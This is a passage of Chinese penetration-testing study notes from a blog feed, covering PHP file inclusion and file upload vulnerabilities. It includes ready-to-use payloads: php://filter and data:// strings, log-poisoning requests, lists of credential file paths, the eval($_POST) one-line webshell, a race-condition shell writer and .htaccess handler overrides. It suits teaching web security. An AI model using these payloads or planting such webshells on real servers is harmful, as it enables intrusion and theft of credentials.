远程文件包含漏洞(RFI)</h2><p>如果PHP的配置选项<code>allow_url_include</code>、<code>allow_url_fopen</code>状态为ON的话，则<strong>include/require</strong>函数是可以加载远程文件的，这种漏洞被称为远程文件包含(RFI)。</p><h1 id="php文件包含漏洞利用">3. PHP文件包含漏洞利用</h1><h2 id="读取敏感文件信息">3.1 读取敏感文件信息</h2><p>利用文件包含可以获取很多敏感信息，包含不存在的文件可能可以获取Web服务器、Web根目录、网站路径以及服务器的操作系统信息，根据Web服务器和Web根目录可以获取Apache的配置文件信息和日志文件信息，同时在知道服务器的操作系统后，也可以包含一些操作系统的敏感文件获取相关信息。利用文件包含获取敏感文件就是需要尽可能多的收集敏感文件的路径。</p><p>Windows系统:</p><ul><li><code>C:\boot.ini</code> //查看系统版本</li><li><code>C:\windows\system32\inetsrv\MetaBase.xml</code>//IIS配置文件</li><li><code>C:\windows\repair\sam</code>//存储Windows系统初次安装的密码</li><li><code>C:\ProgramFiles\mysql\my.ini</code> //MySQL配置信息</li><li><code>C:\ProgramFiles\mysql\data\mysql\user.MYD</code> //MySQLroot密码</li><li><code>C:\windows\php.ini</code> //php配置信息</li></ul><p>Linux/Unix系统:</p><ul><li><code>/etc/password</code> //账户信息</li><li><code>/etc/shadow</code> //账户密码信息</li><li><code>/usr/local/app/apache2/conf/httpd.conf</code>//Apache2配置文件</li><li><code>/usr/local/app/apache2/conf/extra/httpd-vhost.conf</code>//虚拟网站配置</li><li><code>/usr/local/app/php5/lib/php.ini</code> //PHP配置文件</li><li><code>/etc/httpd/conf/httpd.conf</code> //Apache配置文件</li><li><code>/etc/my.conf</code> //mysql配置文件</li></ul><h2 id="本地包含配合文件上传">3.2 本地包含配合文件上传</h2><p>文件上传漏洞在绕过内容检测的时候，会制作图片马上传，但是图片马在上传之后，又不能解析。如果网站同时存在文件包含漏洞，利用文件包含无视后缀名，只要被包含的文件内容符合PHP语法规范，任何扩展名都可以被PHP解析的特点来解析上传的图片马。制作图片马的方式有很多，常见的有两种：</p><ul><li>在图片后写入脚本代码</li><li>在cmd中使用命令<code>copy 1.jpg/b+1.php/a 2.jpg</code></li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">参数<span class="hljs-regexp">/b指定以二进制格式复制、合并文件，用于图像类/</span>声音类文件<br>参数/a指定以ASCII格式复制、合并文件，用于txt等文档类文件<br></code></pre></td></tr></table></figure><h2 id="远程包含webshell">3.3 远程包含Webshell</h2><ul><li>本地包含只能包含目标服务器本地已有的文件，若目标服务器本地不存在木马文件，则无法利用。因此可以借助远程文件包含漏洞，在操作机本地搭建Web服务器，远程包含木马文件Getshell。</li><li>利用方法：在无其他漏洞，只有文件包含漏洞，且目标服务器本地无shell文件可利用，又可以远程文件包含时，可以在攻击机本地新建一个一句话木马文件（比如：shell.txt，不要以.php的文件存在，因为php文件在操作机本地会被解析），然后远程包含攻击机本地新建的木马文件，从而Getshell。</li></ul><h2 id="包含apache日志文件">3.4 包含Apache日志文件</h2><ul><li><p>Apache两个日志文件:<code>access.log</code>、<code>error.log</code>。</p></li><li><p>找到Apache路径，利用包含漏洞包含日志文件获取Webshell。</p></li><li><p>利用方法：当访问不存在的资源时，apache日志同样会记录。访问:<code>127.0.0.1/include/?&lt;?php phpinfo();?&gt;</code>，再包含access.log.</p></li></ul><h2 id="包含ssh日志文件">3.5 包含SSH日志文件</h2><p>把用户名写成"phpinfo"，ssh的登陆日志就会把此次的登陆行为记录到日志中.实例：<code>ssh '?php_phpinfo();?&gt;'@192.168.136.143</code></p><h2 id="包含session文件">3.6 包含session文件</h2><p>Session简介:cookie存在客户端，Session存在服务端，Cookie一般用来保存用户的账户密码，Session—般用来跟踪会话。利用场景:一般存在登陆点位置注册用户.</p><h1 id="php封装伪协议">4 PHP封装伪协议</h1><p>PHP 有很多内置URL风格的封装协议，这类协议与fopen()、copy()、file_exist()和filesize()的文件系统函数所提供的功能类似。</p><table><thead><tr class="header"><th>名称</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>file://</td><td>访问本地文件系统</td></tr><tr class="even"><td>http://</td><td>访问HTTP(s)网址</td></tr><tr class="odd"><td>ftp://</td><td>访问FTP(s)URLs</td></tr><tr class="even"><td>php://</td><td>访问各个输入/输出流</td></tr><tr class="odd"><td>zlib://</td><td>压缩流</td></tr><tr class="even"><td>data://</td><td>数据</td></tr><tr class="odd"><td>phar://</td><td>PHP归档</td></tr></tbody></table><h2 id="phpfilter">4.1 php://filter</h2><p><strong>用途</strong>：用于读取源码。读取源代码并进行编码输出，不然会直接当作php代码执行就看不到源代码内容。</p><h3 id="字符串过滤器">4.1.1 字符串过滤器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/string.rot13/resource=flag.php //读出以后利用ROT13解码即可</span><br> <br>php:<span class="hljs-comment">//filter/string.toupper/resource=flag.php //转大写</span><br> <br>php:<span class="hljs-comment">//filter/string.tolower/resource=flag.php //转小写</span><br> <br>php:<span class="hljs-comment">//filter/string.strip_tags/resource=flag.php //php标签里所有东西都会被去除，html只有标签会被去除，里面的文字不会删除</span><br></code></pre></td></tr></table></figure><h3 id="转换过滤器">4.1.2 转换过滤器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># convert.base64-encode &amp; convert.base64-decode</span><br><span class="hljs-comment">## /read=convert.base64-encode/ 表示读取内容经过base64 编码</span><br><span class="hljs-comment">## resource=index.php 表示目标文件为index.php</span><br>php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span><br>php:<span class="hljs-comment">//filter/convert.base64-encode/resource=index.php</span><br><br><span class="hljs-comment"># convert.quoted-printable-encode &amp; convert.quoted-printable-decode</span><br>php:<span class="hljs-comment">//filter/convert.quoted-printable-encode/resource=index.php</span><br><br><span class="hljs-comment"># convert.iconv.*</span><br><span class="hljs-comment">## 这个过滤器需要 php 支持 iconv，而 iconv 是默认编译的。使用convert.iconv.*过滤器等同于用iconv()函数处理所有的流数据。</span><br><span class="hljs-comment">## 可以结合burp进行爆破</span><br>convert.iconv.&lt;input-encoding&gt;.&lt;output-encoding&gt; <br>convert.iconv.&lt;input-encoding&gt;/&lt;output-encoding&gt;<br>php:<span class="hljs-comment">//filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php</span><br></code></pre></td></tr></table></figure><p><code>convert.iconv.*</code>可用编码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br><span class="hljs-attribute">UTF7</span>-IMAP<br><span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br><span class="hljs-attribute">ASCII</span>*<br></code></pre></td></tr></table></figure><h3 id="压缩过滤器">4.1.3 压缩过滤器</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/zlib.deflate|zlib.inflate/resource=flag.php        //zlib.deflate（压缩）｜zlib.inflate（解压）</span><br><span class="hljs-keyword">or</span><br>php:<span class="hljs-comment">//filter/bzip2.compress|bzip2.decompress/resource=flag.php   //bzip2.compress（压缩）|bzip2.decompress（解压）</span><br></code></pre></td></tr></table></figure><h2 id="phpinput">4.2 php://input</h2><p><strong>用途：</strong>可以访问请求的原始数据的只读流,在POST请求中访问POST的data部分，在<code>enctype=multipart/form-data</code>时put://input无效。</p><p><strong>利用：</strong>当传入的参数作为文件名打开时，可以将参数设为php://input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容，从而导致任意代码执行。</p><h2 id="data">4.3 data://</h2><p><strong>用途：</strong>类似与php://input，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。从而导致任意代码执行。</p><p><strong>利用：</strong></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">//实例</span><br><span class="language-xml">data://text/plain,</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml"></span><br><span class="language-xml">//如果此处对特殊字符进行了过滤，我们还可以通过base64编码后再输入：</span><br><span class="language-xml">data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</span><br></code></pre></td></tr></table></figure><h2 id="zip">4.4 zip://</h2><p>利用zip流，先将要执行的PHP代码写好，文件名为test.txt，将test.txt进行zip压缩，压缩文件名为test.zip，上传文件绕过上传检测（若不能直接上传zip文件，便将test.zip重命名为test.jpg后再上传），再进行包含解析。使用zip协议需要指定绝对路径，使用相对路径会包含失败，同时将#编码为%23。</p><p>实例：</p><p><code>?page=zip://C:/Users/40454/Desktop/test.zip%23test.txt</code></p><p><code>?page=zip://C:/Users/40454/Desktop/test.jpg%23test.txt</code></p><h2 id="phar">4.5 phar://</h2><p>先将要执行的PHP代码写好文件名为test.txt，将test.txt进行zip压缩,压缩文件名为test.zip，绕过文件上传的限制，如果可以上传zip文件便直接上传，若不能便将test.zip重命名为test.jpg后再上传。使用phar流绝对路径和相对路径都可以。</p><p>实例：</p><p><code>http://ip/include/include.php?page=phar://C:/server/apache22/htdocs/up/upload/info.zip/info.txt</code></p><p><code>http://ip/include/include.php?page=phar://…/up/upload/info.zip/info.txt</code></p><p><code>http://ip/include/include.php?page=phar://…/up/upload/info.jpg/info.txt</code></p><h2 id="伪协议用法小结">4.6 伪协议用法小结</h2><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311022117065.png"alt="none" /><figcaption aria-hidden="true">none</figcaption></figure><h1 id="绕过方式">5 绕过方式</h1><ul><li>伪协议大小写<ul><li><code>strstr()</code>函数区分大小写，<code>stristr()</code>函数不区分大小写</li></ul></li><li>PHP短标签</li></ul><p>参考教程：</p><ol type="1"><li><ahref="https://blog.csdn.net/m0_46467017/article/details/126380415">文件包含漏洞全面详解_caker丶的博客-CSDN博客</a></li><li><ahref="https://jiashi19.gitee.io/2023/10/16/ctf-web-php伪协议/">ctf-web-php伪协议- Blog from js19 (gitee.io)</a></li><li><ahref="https://blog.csdn.net/qq_44657899/article/details/109300335">php://filter的各种过滤器-CSDN博客</a></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>文件上传与解析</title>
    <link href="/2023/11/11/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A7%A3%E6%9E%90/"/>
    <url>/2023/11/11/%E5%AE%89%E5%85%A8%E6%9C%8D%E5%8A%A1/Web%E6%B8%97%E9%80%8F/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B8%8E%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="文件上传漏洞概述">1. 文件上传漏洞概述</h1><h2 id="概述">1.1 概述</h2><ul><li><p>文件上传是现代互联网常见的功能，允许用户上传图片、视频、及其他类型文件，向用户提供的功能越多，Web受攻击的风险就越大。</p></li><li><p>Form表单编码格式：</p><table><thead><tr class="header"><th>值</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>application/x-www-form-urlencoded</td><td>默认。在发送前对所有字符进行编码(将空格转换为“+"符号，特殊字符转换为ASCIIHEX 值)。</td></tr><tr class="even"><td>multipart/form-data</td><td>不对字符编码。当使用有文件上传控件的表单时，该值是必需的。</td></tr><tr class="odd"><td>text/plain</td><td>将空格转换为“+"符号，但不编码符殊字符。</td></tr></tbody></table><ul><li><code>application/x-www-form-urlencoded</code>：表单中的enctype值如果不设置，默认是此值，将表单中的数据变为键值对的形式。如果action为get，则将表单中的数据转换成一个字符串(name1=value1&amp;name2=value2)，然后把这个字符串附加到URL后面，并用?分割；如果action为post，浏览器把form数据封装到httpbody中，然后发送到服务器。</li><li><code>multipart/form-data</code>：专门用来传输特殊类型数据的，比如文件，会将表单中的数据变成二进制数据，这时候如果用request是无法获取到相应表单的值，应通过stream流对象，将传到服务器端的二进制数据解码，从而读取数据。</li><li><code>text/plain</code>：表单以纯文本形式进行编码</li></ul></li><li><p>上传文件时，如果未对上传的文件进行严格的验证和过滤，就容易造成文件上传漏洞，上传脚本文件(包括asp、aspX、php、jsp等)</p></li><li><p>恶意上传行为可能导致网站甚至整个服务器被控制。恶意的脚本文件又被称为WebShell，WebShell具有强大的功能，如查看服务器目录、服务器中文件、执行系统命令等。</p></li><li><p>Webshell：</p><ul><li>我们可以通过<code>GET 、POST 、COOKIE</code>这三种方式向一个网站提交数据，一句话木马用<code>$_GET[' ']、$_POST[' ']、$_COOKIE[' ']、$_REQUEST[' ']</code>接收我们传递的数据，并把接收的数据传递给一句话木马中执行命令的函数，进而执行命令.</li><li>所以看到的经典一句话木马大多都是只有两个部分，一个是可以执行代码的函数部分，一个是接收数据的部分.例如：<code>&lt;?php eval(@$_POST['cmd']); ?&gt;</code>，其中<code>eval</code>就是执行命令的函数，<code>$_POST['cmd']</code>就是接收的数据，eval函数把接收的数据当作PHP代码来执行.这样我们就能够让插入了一句话木马的网站执行我们传递过去的任意PHP语句，这便是一句话木马的强大之处.</li></ul></li></ul><h2 id="成因">1.2 成因</h2><ul><li>Web应用开放了文件上传功能，并且<strong>对上传的文件没有进行足够的限制</strong></li><li>程序开发部署时候，没有考虑到<strong>系统特性</strong>和过滤不严格</li><li>攻击者通过<strong>Web服务器解析漏洞</strong>绕过限制，导致可以上传任意文件</li></ul><h2 id="利用">1.3 利用</h2><ul><li>Web 服务器要开启文件上传功能，并且上传api(接口）对外“开放”(Web用户可以访问）</li><li>Web用户对目标目录具有可写权限，甚至具有执行权限，一般情况下，Web目录都有执行权限。</li><li>要想完美利用文件上传漏洞，就是上传的文件可以执行，也就是web容器可以解我们上传的脚本，无论脚本以什么样的形式存在。</li></ul><h2 id="危害">1.4 危害</h2><ul><li>文件上传漏洞最直接的威胁就是<strong>上传任意文件</strong>，包括恶意脚本、可执行程序等。</li><li>如果Web服务器所保存上传文件的可写目录具有执行权限，那么就可以直接上传后门文件，导致<strong>网站沦陷</strong>。</li><li>如果攻击者通过其他漏洞进行提权操纵，拿到系统管理权限，那么直接导致<strong>服务器沦陷</strong>。</li><li>同服务器下的其他网站无一幸免，均会被攻击者控制。</li></ul><h2 id="获取上传文件信息">1.5 获取上传文件信息</h2><p>处理文件上传功能时，会利用表单中的文件上传域，定义表单时必须设置enctype="multipart/form-data"参数。在上传文件后，可以使用$_FILES[‘upfile’]访问文件的有关信息。上传文件的相关信息：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]; <span class="hljs-regexp">//</span>客户端上传文件的原名称，不包含路径<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>]; <span class="hljs-regexp">//</span>上传文件的MIME类型  <br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]; <span class="hljs-regexp">//</span>已上传文件在服务器端保存的临时文件名，包含路径<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;error&#x27;</span>]; <span class="hljs-regexp">//</span>上传文件出现的错误号，为一个整数<br><span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upfile&#x27;</span>][<span class="hljs-string">&#x27;size&#x27;</span>]; <span class="hljs-regexp">//</span>已上传文件的大小，单位为字节<br></code></pre></td></tr></table></figure><h1 id="文件上传检测与绕过">2. 文件上传检测与绕过</h1><h2 id="客户端检测与绕过">2.1 客户端检测与绕过</h2><h3 id="检测原理">2.1.1 检测原理</h3><p>客户端(Client):或称为用户端(前端），与服务器相对应。由于客户端对于文件上传漏洞的防御是通过JS代码实现的，所以客户端检测与绕过也称为JS检测与绕过。</p><h3 id="绕过方法">2.1.2 绕过方法</h3><ul><li>删除浏览器事件（表单提交时触发的事件）</li><li>利用BurpSuite抓包修改文件后缀名</li><li>伪造上传表单（感觉相对其他两种方法比较麻烦）</li></ul><h2 id="服务端检测与绕过">2.2 服务端检测与绕过</h2><h3 id="检测原理-1">2.2.1 检测原理</h3><ul><li>后缀名检测与绕过</li><li>MIME类型检测与绕过</li><li>文件内容检测与绕过</li><li>00截断检测与绕过</li><li>条件竞争检测与绕过</li></ul><h3 id="后缀名检测与绕过">2.2.2 后缀名检测与绕过</h3><ul><li><p>黑名单--大小写绕过</p></li><li><p>黑名单--名单列表绕过(黑名单之外的后缀名）：有些中间件允许解析其他文件后缀名，如php3、phtml的文件。</p></li><li><p>黑名单--Windows特性：一些特殊的文件名命名方式在Vindows下是不被允许的，利用BurpSuite抓包修改后缀名，绕过验证后的上传文件，windows会自动去掉后面添加的，但要注意Unix/Linux系统没有这个特性。比如：</p><ul><li>末尾的点（.）<code>1.php.</code></li><li>空格（）<code>1.php</code></li><li>::<span class="math inline">\(DATA `1.php::\)</span>DATA`</li></ul></li><li><p>白名单绕过：需要配合文件包含漏洞或者解析漏洞</p></li><li><p>.htaccess文件攻击：.htaccess文件是Apache服务器中的分布式配置文件(IIS中不存在该文件），该配置文件会覆盖Apache服务器的全局配置，作用于当前目录及其子目录。如果一个Web应用允许上传.htaccess文件，那就意味着攻击者可以更改Apache的配置，这是十分危险。在httpd.conf配置文件中，AlowOverride参数就是指明Apache服务器是否去找.htacess文件作为配置文件，如果设置为none,那么服务器将忽略.htacess文件;如果设置为All,那么所有在.htaccess文件里有的指令都将被重写，即允许.htaccess文件覆盖掉Apache的配置。（利用：先上传该配置文件，再上传脚本文件）</p><ul><li><p>匹配文件内容，将内容符合php语法规则的文件当作PHP文件解析：<code>SetHandler application/x-httpd-php</code></p></li><li><p>匹配文件名中的关键字，比如：当文件名[info.php.png]中包含关键字[.php]，并且.htaccess文件内容为<code>AddHandler php5-script .php</code>，info.php.png中的代码会被执行。</p></li><li><p>匹配文件名</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-section">&lt;FilesMatch <span class="hljs-string">&quot;kai&quot;</span>&gt;</span><br><span class="hljs-attribute">SetHandler</span> application/x-httpd-php<br><span class="hljs-section">&lt;/FilesMatch&gt;</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>结合Apache文件解析机制，从右向左开始解析文件后缀，若后缀名不可识别，则继续判断直到遇到可解析的后缀为止。</p></li></ul><h3 id="mime类型检测与绕过">2.2.3 MIME类型检测与绕过</h3><p>MME(Multipurpose lnternet MailExtensions)是描述消息内容类型的因特网标准。MIME消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。常见的MIME类型如下：</p><table><thead><tr class="header"><th>文件扩展名</th><th>MIME-Type</th></tr></thead><tbody><tr class="odd"><td>.js</td><td>application/x-javascript</td></tr><tr class="even"><td>.html</td><td>text/html</td></tr><tr class="odd"><td>.jpg</td><td>image/jpeg</td></tr><tr class="even"><td>.png</td><td>image/png</td></tr><tr class="odd"><td>.pdf</td><td>application/pdf</td></tr></tbody></table><p>在HTTP协议中，使用Content-Type字段表示文件的MIME类型，可抓包进行修改。</p><h3 id="文件内容检测与绕过">2.3.4 文件内容检测与绕过</h3><p>检测原理：</p><ul><li>getimagesize()</li><li>文件幻数检测<ul><li>JPG:FF D8 FF E0 00 10 4A 46 49 46</li><li>GIF:47 49 46 38 39 61(GIF89a）</li><li>PNG:89 50 4E 47</li></ul></li></ul><p>绕过方法：</p><ul><li>在脚本文件开头补充图片对应的头部值（幻数）</li><li>制作图片马（图片木的解析需要配合文件包含漏洞或者解析漏洞），在图片后写入脚本代码：<code>copy 1.jpg/b+1.php/a 2.jpg</code><ul><li>参数/b指定以二进制格式复制、合并文件，用于图像类/声音类文件</li><li>参数/a指定以ASCIl格式复制、合并文件，用于txt等文档类文件</li></ul></li></ul><h3 id="截断检测与绕过">2.3.5 00截断检测与绕过</h3><p>检测原理：</p><ul><li><p>截断漏洞出现的核心就是chr(0)，这个字符不为空(Nul)，也不是空字符（"")，更不是空格。当程序在输出含有chr(0)变量时，chr(0)后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致了漏洞产生。</p></li><li><p>由于0x00是字符串的结束标识符，PHP会把0x00后面的所有字符删除。攻击者可以利用手动添加字符串标识符的方式来将后面的内容进行截断，而后面的内容又可以帮助我们绕过检测。利用00截断绕过需要同时满足两个条件：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>. PHP版本必须小于<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">2</span>. php.ini配置文件中的magic_quotes_gpc为<span class="hljs-literal">Off</span>状态（GPC关闭）<br></code></pre></td></tr></table></figure></li></ul><p>绕过方法：</p><ul><li>GET方式：%00</li><li>POST方式：0x00</li></ul><h3 id="条件竞争检测与绕过">2.3.6 条件竞争检测与绕过</h3><p>检测原理：一些网站文件检测逻辑是先允许上传任意文件，然后检查文件内容是否包含可执行脚本，如果包含则删除。</p><p>绕过方法：利用成功上传到删除文件的时间差，上传一个.php文件，在未删除之前立即访问，则会自动生成—个新php文件，新文件不会被删除。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>), <span class="hljs-string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]); ?&gt;&#x27;</span>); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="常见函数">2.3 常见函数</h2><p><strong>deldot():</strong></p><p>deldot()函数为upload-labs中一个常见的函数，它实际为一个自定义函数.功能：从字符串的尾部开始，从后向前删除点<code>.</code>，直到该字符串的末尾字符不是<code>.</code>为止.</p><p><strong>in_array():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">array</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$strict</span> = <span class="hljs-literal">false</span>): <span class="hljs-keyword">bool</span><br></code></pre></td></tr></table></figure><p>功能：用来检查数组中是否存在某个值，如果找到 needle 则返回true，否则返回 false.</p><p><strong>intval():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">int</span> <span class="hljs-title function_ invoke__">intval</span> ( <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$var</span> [, <span class="hljs-keyword">int</span> <span class="hljs-variable">$base</span> = <span class="hljs-number">10</span> ] )<br></code></pre></td></tr></table></figure><p>功能：通过使用指定的进制 base 转换（默认是十进制），返回变量 var 的integer 数值.</p><p><strong>strrchr():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strrchr</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>): <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>功能：strrchr函数在字符串haystack中查找needle，并将最后一次查找到的needle及其后面的字符串返回.如果没有在该字符串中查找到needle，则返回false.</p><p><strong>strtolower():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$string</span>): <span class="hljs-keyword">string</span><br></code></pre></td></tr></table></figure><p>功能：将字符串string中的各个英文字符转换为小写并返回</p><p><strong>strrpos():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$start</span> = <span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>功能：返回字符<code>$needle</code>最后一次出现的位置</p><p><strong>str_ireplace()</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$search</span>,<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$replace</span>,<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$subject</span>,<span class="hljs-keyword">int</span> &amp;<span class="hljs-variable">$count</span> = ?)<br></code></pre></td></tr></table></figure><p>功能：用于对数组中的元素或字符串中的子串进行替换，替换从左到右进行，该函数替换不区分字母大小写（另外一个函数<code>str_replace</code>区分大小写）.第一个参数<code>$search</code>为需要替换的内容（子串或数组），第二个参数<code>$replace</code>为替换成的内容（字符串或数组），第三个参数<code>$subject</code>为被替换的字符串.</p><p><strong>strstr():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">strstr</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$haystack</span>, <span class="hljs-keyword">mixed</span> <span class="hljs-variable">$needle</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$before_needle</span> = <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>功能：查找字符串<code>$needle</code>在<code>$haystack</code>中首次出现的位置，并将<code>$needle</code>及其之后的字符串返回.</p><p><strong>substr():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$string</span>, <span class="hljs-keyword">int</span> <span class="hljs-variable">$offset</span>, ?<span class="hljs-keyword">int</span> <span class="hljs-variable">$length</span> = <span class="hljs-literal">null</span>)<br></code></pre></td></tr></table></figure><p>功能：返回字符串<code>$string</code>中的子串.<code>$offset</code>指定子串首个字符在<code>$string</code>中的下标位置，<code>$length</code>指定截取的子串长度.</p><p><strong>trim():</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">trim</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span>, <span class="hljs-keyword">string</span> <span class="hljs-variable">$character_mask</span> = <span 